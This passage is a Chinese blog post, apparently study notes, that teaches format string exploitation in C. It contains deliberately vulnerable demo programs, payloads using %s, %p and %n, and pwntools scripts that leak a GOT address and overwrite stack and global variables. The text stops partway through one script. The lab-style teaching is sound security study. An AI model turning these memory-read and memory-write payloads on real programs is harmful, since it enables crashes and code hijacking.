@@ -1,0 +1,513 @@
+<!DOCTYPE html>
+<html>
+  <head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport">
+  <meta name="description" content="SX1ang&#39;s blog">
+  <meta name="keyword" content="">
+  
+    <link rel="shortcut icon" href="/css/images/logo.png">
+  
+  <title>
+    
+      格式化字符串 | SX1ang
+    
+  </title>
+  <link href="//cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet">
+  <link href="//cdnjs.cloudflare.com/ajax/libs/nprogress/0.2.0/nprogress.min.css" rel="stylesheet">
+  <link href="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/styles/tomorrow.min.css" rel="stylesheet">
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+  <script src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+  <script src="//cdnjs.cloudflare.com/ajax/libs/geopattern/1.2.3/js/geopattern.min.js"></script>
+  <script src="//cdnjs.cloudflare.com/ajax/libs/nprogress/0.2.0/nprogress.min.js"></script>
+  
+  
+  
+  
+    <!-- MathJax support START -->
+    <script type="text/x-mathjax-config">
+      MathJax.Hub.Config({
+        tex2jax: {
+          inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+          processEscapes: true,
+          skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+        }
+      });
+    </script>
+
+    <script type="text/x-mathjax-config">
+      MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax(), i;
+        for (i=0; i < all.length; i += 1) {
+          all[i].SourceElement().parentNode.className += ' has-jax';
+        }
+      });
+    </script>
+    <script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+    <!-- MathJax support END -->
+  
+
+
+  
+  
+    
+<script src="/js/local-search.js"></script>
+
+
+<meta name="generator" content="Hexo 5.3.0"></head>
+<div class="wechat-share">
+  <img src="/css/images/logo.png" />
+</div>
+  <body>
+    <header class="header fixed-header">
+  <div class="header-container">
+    <a class="home-link" href="/">
+      <div class="logo"></div>
+      <span>SX1ang</span>
+    </a>
+    <ul class="right-list">
+      
+        <li class="list-item">
+          
+            <a href="/" class="item-link">Home</a>
+          
+        </li>
+      
+        <li class="list-item">
+          
+            <a href="/tags/" class="item-link">Tags</a>
+          
+        </li>
+      
+        <li class="list-item">
+          
+            <a href="/archives/" class="item-link">Archives</a>
+          
+        </li>
+      
+        <li class="list-item">
+          
+            <a href="/about/" class="item-link">About</a>
+          
+        </li>
+      
+      
+        <li class="menu-item menu-item-search right-list">
+    <a role="button" class="popup-trigger">
+        <i class="fa fa-search fa-fw"></i>
+    </a>
+</li>
+      
+    </ul>
+    <div class="menu">
+      <span class="icon-bar"></span>
+      <span class="icon-bar"></span>
+      <span class="icon-bar"></span>
+    </div>
+    <div class="menu-mask">
+      <ul class="menu-list">
+        
+          <li class="menu-item">
+            
+              <a href="/" class="menu-link">Home</a>
+            
+          </li>
+        
+          <li class="menu-item">
+            
+              <a href="/tags/" class="menu-link">Tags</a>
+            
+          </li>
+        
+          <li class="menu-item">
+            
+              <a href="/archives/" class="menu-link">Archives</a>
+            
+          </li>
+        
+          <li class="menu-item">
+            
+              <a href="/about/" class="menu-link">About</a>
+            
+          </li>
+        
+      </ul>
+    </div>
+    
+      <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+            <span class="search-icon">
+                <i class="fa fa-search"></i>
+            </span>
+            <div class="search-input-container">
+                <input autocomplete="off" autocapitalize="off"
+                    placeholder="Please enter your keyword(s) to search." spellcheck="false"
+                    type="search" class="search-input">
+            </div>
+            <span class="popup-btn-close">
+                <i class="fa fa-times-circle"></i>
+            </span>
+        </div>
+        <div id="search-result">
+            <div id="no-result">
+                <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+            </div>
+        </div>
+    </div>
+</div>
+    
+  </div>
+</header>
+
+    <div id="article-banner">
+  <h2>格式化字符串</h2>
+  <p class="post-date">2021-03-14</p>
+  <div class="arrow-down">
+    <a href="javascript:;"></a>
+  </div>
+</div>
+<main class="app-body flex-box">
+  <!-- Article START -->
+  <article class="post-article">
+    <section class="markdown-content"><blockquote>
+<p>  学习笔记</p>
+<p>  参考：<a target="_blank" rel="noopener" href="https://ciphersaw.me/ctf-wiki/pwn/linux/fmtstr/fmtstr_intro/">格式化字符串漏洞</a></p>
+</blockquote>
+<h2 id="格式化字符串漏洞原理"><a href="#格式化字符串漏洞原理" class="headerlink" title="格式化字符串漏洞原理"></a>格式化字符串漏洞原理</h2><p>格式化字符串函数可以接受可变数量的参数，并将第一个参数作为格式化字符串，根据其来解析之后的参数。</p>
+<img src="/2021/03/14/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/image-20210530235921399.png" style="zoom:200%;">
+
+<p><strong>常见的格式化字符串函数</strong></p>
+<img src="/2021/03/14/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/image-20210531000040197.png" alt style="zoom:200%;">
+
+<p><strong>格式化字符串</strong></p>
+<p>参考：<a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2">https://zh.wikipedia.org/wiki/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2</a></p>
+<p>主要内容：</p>
+<p>%n$ 获取格式化字符串中的指定参数</p>
+<p>hh 输出一个单字节</p>
+<p>h 输出一个双字节</p>
+<p>%x/%X 16进制unsigned int，x使用小写字母，X使用大写字母</p>
+<p>%p 输出对应变量的值</p>
+<p>%s 解析其地址对应的字符串</p>
+<p>%n 不输出字符，但是把已经成功输出的<strong>字符个数</strong>写入对应的整型指针参数所指的变量</p>
+<p>当没有为格式化字符串函数提供格式化字符串的参数时，程序会将栈上存储的格式化字符串的地址的上面的变量作为格式化字符串的参数，这样就造成了格式化字符串漏洞，可以利用格式化字符串漏洞实现对栈上地址甚至是任意地址的读写。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// gcc -m32 -fno-stack-protector -no-pie -o test test.c</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">        <span class="keyword">char</span> str[<span class="number">100</span>];</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, str);</span><br><span class="line">        <span class="built_in">printf</span>(str);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><img src="/2021/03/14/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/image-20210531002705288.png"></p>
+<p>编译报警告。</p>
+<p>输入：%p.%p.%p</p>
+<p><img src="/2021/03/14/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/image-20210531003301487.png"></p>
+<p>没有给printf参数，程序会自己到栈上取变量来作为参数，上面读取到了栈上的值。</p>
+<h2 id="格式化字符串漏洞利用"><a href="#格式化字符串漏洞利用" class="headerlink" title="格式化字符串漏洞利用"></a>格式化字符串漏洞利用</h2><blockquote>
+<p>  格式化字符串漏洞的利用方式主要为使程序崩溃，读（泄露）写（覆盖）内存。</p>
+</blockquote>
+<h3 id="程序崩溃"><a href="#程序崩溃" class="headerlink" title="程序崩溃"></a>程序崩溃</h3><p>让程序崩溃用到格式化字符串主要是%s，%s是解析其地址对应的字符串。如果%s解析的是一个不可访问地址，比如说0，那么程序就会因此而崩溃。还是上面那个程序，如果输入：%s%s%s%s%s%s%s%s%s%s%s%s…（若干个%s），程序就会崩溃。因为不可能栈上每个值都对应了合法的地址，所以总是会有某个地址可以使得程序崩溃。 </p>
+<p><img src="/2021/03/14/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/image-20210531010520713.png"></p>
+<h3 id="泄露栈内存"><a href="#泄露栈内存" class="headerlink" title="泄露栈内存"></a>泄露栈内存</h3><blockquote>
+<p>  泄露栈内存可以获取栈上的值，如果栈上的值是某个变量或字符串地址，那么还可以获取该地址值对应的变量或字符串的内容。</p>
+</blockquote>
+<p><strong>示例程序（32位）：</strong></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// gcc -m32 -fno-stack-protector -no-pie -o test test.c</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s[<span class="number">100</span>];</span><br><span class="line">  <span class="keyword">int</span> a = <span class="number">1</span>, b = <span class="number">0x22222222</span>, c = <span class="number">-1</span>;</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, s); </span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%08x.%08x.%08x.%s\n&quot;</span>, a, b, c, s); </span><br><span class="line">  <span class="built_in">printf</span>(s); <span class="comment">//没有给出格式化字符串的参数，而且s用户可控，存在格式化字符串漏洞</span></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>程序没有给出格式化字符串的参数，而且变量s用户可控，所以存在格式化字符串漏洞，这里只看格式化字符串漏洞。</p>
+<p><strong>获取栈上的值：</strong></p>
+<blockquote>
+<p>  获取栈上的值主要用到%x或%p。</p>
+</blockquote>
+<p>输入%08x.%08x.%08x（8是输出长度，0是填充字符，.是分隔符），用gdb调试；</p>
+<p><img src="/2021/03/14/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/image-20210601162730968.png"></p>
+<p>可以看到栈上0xffffcec0处是格式化字符串的地址，0xffffcec4处是格式化字符串函数的第二个参数，同时也是格式化字符串的第一个参数。这两处存放的都是字符串”%08x.%08x.%08x”的地址，这是因为没有提供格式化字符串的参数，所以程序会将格式化字符串本身作为格式化字符串的第一个参数。如果将代码<code>printf(s);</code>改为<code>printf(s, 1);</code>，栈结构就不是这样：</p>
+<p><img src="/2021/03/14/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/image-20210601164219007.png"></p>
+<p>程序运行完成之后，会按顺序打印栈上的值。</p>
+<p><img src="/2021/03/14/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/image-20210601163942545.png"></p>
+<p>由于格式化字符串为%x%x%x，所以，程序会将栈上的值按照十六进制int型进行解析并输出。也可以使用%p来获取数据（%p打印地址，十六进制）。</p>
+<p><img src="/2021/03/14/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/image-20210601165436119.png"></p>
+<p><strong>注意：</strong>因为栈是不对内存初始化的，所以栈上的数据会因为每次分配的内存页不同而不同。</p>
+<p>上面讲的是依次按顺序获取栈上的值，真正利用的时候一般都是直接获取栈上某个指定的值，当然前提是这个指定的值是可读的。可以直接用<code>%n$x</code>获取栈上格式化字符串函数的第n+1个参数的值，格式化字符串的第n个参数的值。</p>
+<p>对于上面的程序，输入：%2$x，用gdb调试；</p>
+<p><img src="/2021/03/14/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/image-20210601170849894.png"></p>
+<p>可以看到打印了格式化字符串第二个参数的值，严格来说是打印从格式化字符串函数的第一个参数处往下偏移2*4byte处的值。为什么是4byte，因为%x是int型，输出为4byte。</p>
+<p><strong>获取栈上的地址值对应的内容：</strong></p>
+<blockquote>
+<p>  获取栈上的地址值对应的内容主要用到%s，%s会将参数解析成地址，并打印对应地址的内容。</p>
+</blockquote>
+<p>还是上面的程序，输入%s；</p>
+<p><img src="/2021/03/14/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/image-20210601175201149.png"></p>
+<p>可以看到程序将格式化字符串的第一个参数地址值对应的内容（%s）打印了出来。</p>
+<p>也可以用%n$s打印指定的参数。</p>
+<p><strong>注意：</strong> 如果栈上对应的值不能够被解析为字符串地址，那么程序就会直接崩溃。</p>
+<p><img src="/2021/03/14/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/image-20210601181131784.png"></p>
+<p>%4$s对应的ascii为0x73243425（小端），不是合法的地址，不能被解析，导致程序崩溃。</p>
+<p><strong>小技巧总结：</strong></p>
+<blockquote>
+<ol>
+<li> 利用%x来获取对应栈的内存，但建议使用%p，可以不用考虑位数的区别</li>
+<li> 利用%s来获取变量所对应地址的内容，只不过有零截断</li>
+<li> 利用%n$x来获取指定参数的值，利用%n$s来获取指定参数对应地址的内容</li>
+</ol>
+</blockquote>
+<h3 id="泄露任意地址内存"><a href="#泄露任意地址内存" class="headerlink" title="泄露任意地址内存"></a>泄露任意地址内存</h3><p>上一节提到的泄露栈内存，是没有完全控制所要泄露的变量的地址，如果需要泄露got表中的函数地址，那么用之前的方法效果就不是太好，这时候就要想办法泄露任意地址内存。</p>
+<p>格式化字符串是存储在栈上的，因为格式化字符串是格式化字符串函数的参数，也就是局部变量，所以格式化字符串的内容是存储在栈上的。</p>
+<p><img src="/2021/03/14/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/image-20210601195449830.png"></p>
+<p>可以看到输入的格式化字符串%p%p%p是存放在栈上的0xffffced0处的。</p>
+<p>可以利用这个特点来泄露任意地址内存。可以将需要泄露的内容的地址写到格式化字符串中，然后利用%s获取它的内容。一般的格式是：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[address]%n$s</span><br></pre></td></tr></table></figure>
+<p>address是要获取的内容所在的内存地址。</p>
+<p>注意一下栈对齐：</p>
+<p><img src="/2021/03/14/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/image-20210602003520114.png"></p>
+<p>接下来的问题是要找到输入的格式化字符串在栈上的偏移，也就是确定格式化字符串是第几个参数。如果能够直接调试程序的话，可以通过查看栈结构来找到格式化字符串所存放的位置，如果是fuzz的话，一般方法是：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[tag]%p%p%p%p%p%p%p%p%p%p%p%p%p...</span><br></pre></td></tr></table></figure>
+<p>tag是字符串，32位可以用AAAA，这样的话当碰到输入的格式化字符串就会被%p解析成为0x41414141，只要判断0x41414141位于哪个位置，就可以确定格式化字符串的位置。64位可以用AAAAAAAA。</p>
+<p><img src="/2021/03/14/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/image-20210602005051275.png"></p>
+<p>可以看到第四个参数的位置处打印出0x41414141，也就是AAAA的ascii，所以格式化字符串位于第四个参数处，意思是第四个参数处是存放格式化字符串的起始地址。如果将AAAA用任意地址替换掉，那么就可以通过%4$s获取任意地址存放的内容。要注意的是”任意地址”可以放在格式化字符串的任何位置，只要格式化字符串在栈上，就可以访问到它，为了方便一般放在格式化字符串的前面或后面。</p>
+<p>还是上面的那个漏洞程序，如果将AAAA替换成scanf@got的地址，就可以得到scanf函数的地址。</p>
+<p><img src="/2021/03/14/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/image-20210602085838276.png"></p>
+<p>这里scanf@got是不能通过命令行直接输入的，因为地址对应的字符是不可见的，需要用到pwntools。</p>
+<p><strong>exp：</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#io = process(&quot;./readmem&quot;)</span></span><br><span class="line">io = gdb.debug([<span class="string">&#x27;./readmem&#x27;</span>], <span class="string">&#x27;b printf&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io_elf = ELF(<span class="string">&quot;./readmem&quot;</span>)</span><br><span class="line">scanf_got = io_elf.got[<span class="string">&quot;__isoc99_scanf&quot;</span>]</span><br><span class="line">print(<span class="built_in">hex</span>(scanf_got))</span><br><span class="line"></span><br><span class="line">payload = p32(scanf_got) + <span class="string">b&quot;%4$s&quot;</span></span><br><span class="line">print(payload)</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.recvuntil(<span class="string">&quot;%4$s\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">scanf_addr = <span class="built_in">hex</span>(u32(io.recv()[<span class="number">4</span>:<span class="number">8</span>]))</span><br><span class="line">print(scanf_addr)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+<p><img src="/2021/03/14/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/image-20210602100241679.png"></p>
+<p>输出了scanf@got的地址：0xf7dc0d10。</p>
+<p><img src="/2021/03/14/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/image-20210602100336714.png"></p>
+<p>有时候“任意地址”所在的栈地址不一定是4的整数倍，也就是说不能通过%n$s的方式获取其内容，需要修改“任意地址”的位置，让它位于4的整数倍的地址处，最简单的做法是在地址前面填充字符：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[padding][address]%n$s</span><br></pre></td></tr></table></figure>
+<p>这种做法就相当于手工实现栈对齐。</p>
+<p><strong>注意截断字符：</strong></p>
+<p>这里没有用printf@got的地址，是因为程序中的scanf在读取我们输入的地址时，会存在截断。scanf(“%s”)会将空格，制表符，换行符，换页符当做数据的终止符，主要是EOF 0x09 0x0A 0x0B 0x0C 0x0D 0x20，而且不保留截断字符。具体可以参考：<a target="_blank" rel="noopener" href="https://xuanxuanblingbling.github.io/ctf/pwn/2020/12/16/input/">https://xuanxuanblingbling.github.io/ctf/pwn/2020/12/16/input/</a></p>
+<p>printf@got的地址是0x804a00c，其中\x0c会截断，pwntools传入payload：<code>\x0c\xa0\x04\x08%4$s</code>，这里调试看一下：</p>
+<p><img src="/2021/03/14/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/image-20210602140046126.png"></p>
+<p>发现\x0c没有被读取，这是因为\x0c是最先被读入的，会产生截断，\x0c不被保留，但是因为\x0c截断之后scanf函数没有读到任何内容，所以会继续进行读取，然后就将\xa0\x04\x08%4$s读入，并存放到栈上。如果传入的payload是<code>aaaa\x0c\xa0\x04\x08%4$s</code>，那么scanf就只会读到aaaa。</p>
+<p><img src="/2021/03/14/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/image-20210602145252007.png"></p>
+<h3 id="x86-64"><a href="#x86-64" class="headerlink" title="x86_64"></a>x86_64</h3><p>前面讲的都是在32位的操作系统中，在64位的系统中稍有区别。主要原因是32位和64位的函数调用约定是不相同的。</p>
+<p>x86_32：函数调用时参数存放在栈上，通过栈传递参数</p>
+<p>x86_64：函数调用时，前6个参数一次通过rdi, rsi, rdx, rcx, r8, r9寄存器传递，超出六个参数以外的参数就通过栈传递</p>
+<p>在使用%n$p获取64位系统栈上的值时，需要跳过前5个参数，因为这5个参数都保存在寄存器中。</p>
+<p><img src="/2021/03/14/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/image-20210602103927954.png"></p>
+<p>可以看到格式化字符串存储在%6$p处。64位主要就是这里会有一点不同。</p>
+<h3 id="覆盖栈内存"><a href="#覆盖栈内存" class="headerlink" title="覆盖栈内存"></a>覆盖栈内存</h3><blockquote>
+<p>  前面讲的是泄露栈内存和任意地址内存，利用格式化字符串漏洞还可以覆盖栈内存甚至是覆盖任意地址内存。</p>
+</blockquote>
+<p>修改内存用到的格式化字符串主要是：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%n  不输出字符，但是把已经成功输出的字符个数写入对应的整型指针参数所指的变量</span><br></pre></td></tr></table></figure>
+<p><strong>示例程序（32位）：</strong></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// gcc -m32 -fno-stack-protector -no-pie -o test test.c</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="keyword">int</span> a = <span class="number">123</span>, b = <span class="number">456</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">int</span> c = <span class="number">789</span>;</span><br><span class="line">  <span class="keyword">char</span> s[<span class="number">100</span>];</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%p\n&quot;</span>, &amp;c);</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, s);</span><br><span class="line">  <span class="built_in">printf</span>(s);</span><br><span class="line">  <span class="keyword">if</span> (c == <span class="number">16</span>) &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;modified c.&quot;</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (a == <span class="number">2</span>) &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;modified for a small number.&quot;</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (b == <span class="number">0x12345678</span>) &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;modified b for a big number!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>利用格式化字符串%n的特点可以构造基本的payload：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">...[overwrite address]...%[address offset]$n</span><br></pre></td></tr></table></figure>
+<p>其中…表示填充的内容，overwrite address是要覆盖的地址，address offset是要覆盖的地址存储的位置是格式化字符串的第几个参数。利用的主要步骤是：</p>
+<ol>
+<li> 确定覆盖地址</li>
+<li> 确定相对偏移</li>
+<li> 进行覆盖</li>
+</ol>
+<p><strong>确定覆盖地址：</strong></p>
+<p>因为程序开启了地址空间随机化，所以为了方便，上面的漏洞程序输出了变量c的地址。</p>
+<img src="/2021/03/14/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/image-20210602161732505.png" style="zoom:200%;">
+
+<p><strong>确定相对偏移：</strong></p>
+<p>如果能够直接调试程序，那么就可以直接看栈结构找到格式化字符串所在的位置；如果不能调试，那么就可以用之前提到的方法进行fuzz。</p>
+<p><img src="/2021/03/14/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/image-20210602162544315.png"></p>
+<p>可以看到格式化字符串存放在格式化字符串的第六个参数处，可以使用<code>%6$n</code>向它所指向的内存中写入内容。注意%n会将内容当成地址来解析。</p>
+<p><strong>进行覆盖：</strong></p>
+<p>构造payload：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[address_of_c]%a12c%6$n  将c变量的值修改为12，%a12c是填充12个a字符，%6$n向c中写入已经成功输出的字符个数（4+12&#x3D;16）,address_of_c可以放在字符串的任何位置，一般为了方便放在首尾</span><br></pre></td></tr></table></figure>
+<p>address_of_c的长度是4，再加上填充的a，输出长度就会变成16，这样就会将c的值覆盖为16，程序就会打印出modified c.。</p>
+<p><strong>exp.py：</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#io = process(&#x27;./writemem&#x27;)</span></span><br><span class="line">io = gdb.debug([<span class="string">&#x27;./writemem&#x27;</span>], <span class="string">&#x27;b printf&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#recvuntil表示一直接收到\n为止，drop = True表示丢弃最后的\n字符</span></span><br><span class="line">c_addr = <span class="built_in">int</span>(io.recvuntil(<span class="string">&#x27;\n&#x27;</span>, drop = <span class="literal">True</span>), <span class="number">16</span>)</span><br><span class="line">print(<span class="built_in">hex</span>(c_addr))</span><br><span class="line"></span><br><span class="line">payload = p32(c_addr) + <span class="string">b&#x27;%012d&#x27;</span> + <span class="string">b&#x27;%6$n&#x27;</span></span><br><span class="line"><span class="comment">#payload = p32(c_addr) + b&#x27;aaaaaaaaaaaa&#x27; + b&#x27;%6$n&#x27;</span></span><br><span class="line">print(payload)</span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">result = io.recv()</span><br><span class="line">print(result)</span><br></pre></td></tr></table></figure>
+<p><img src="/2021/03/14/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/image-20210602170953717.png"></p>
+<p><img src="/2021/03/14/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/image-20210602171036808.png"></p>
+<h3 id="覆盖任意地址内存"><a href="#覆盖任意地址内存" class="headerlink" title="覆盖任意地址内存"></a>覆盖任意地址内存</h3><p><strong>覆盖为小数字：</strong></p>
+<p>如果要修改变量为一个较小的数字，比如说2，如果将变量的地址放在前面的话，那么变量地址就占4byte，就已经比2大了，所以不能将地址放在开头，可以将地址放在后面，构造payload：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aa%6$n[address_of_a]  %6$n会将a的值修改为2，程序会输出modified for a small number.</span><br></pre></td></tr></table></figure>
+<p>变量a是全局变量，不存放在栈上，存放在.data段中，可以用ida查看a的地址。</p>
+<img src="/2021/03/14/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/image-20210602173439087.png" style="zoom:200%;">
+
+<p><strong>exp.py：</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#io = process(&#x27;./writemem&#x27;)</span></span><br><span class="line">io = gdb.debug([<span class="string">&#x27;./writemem&#x27;</span>], <span class="string">&#x27;b printf&#x27;</span>)</span><br><span class="line"></span><br><span class="line">a_addr = <span class="number">0x0804A024</span></span><br><span class="line">payload = <span class="string">b&#x27;aa&#x27;</span> + <span class="string">b&#x27;%8$naa&#x27;</span>+ p32(a_addr)</span><br><span class="line">print(payload)</span><br><span class="line">io.sendlineafter(<span class="string">&#x27;\n&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">result = 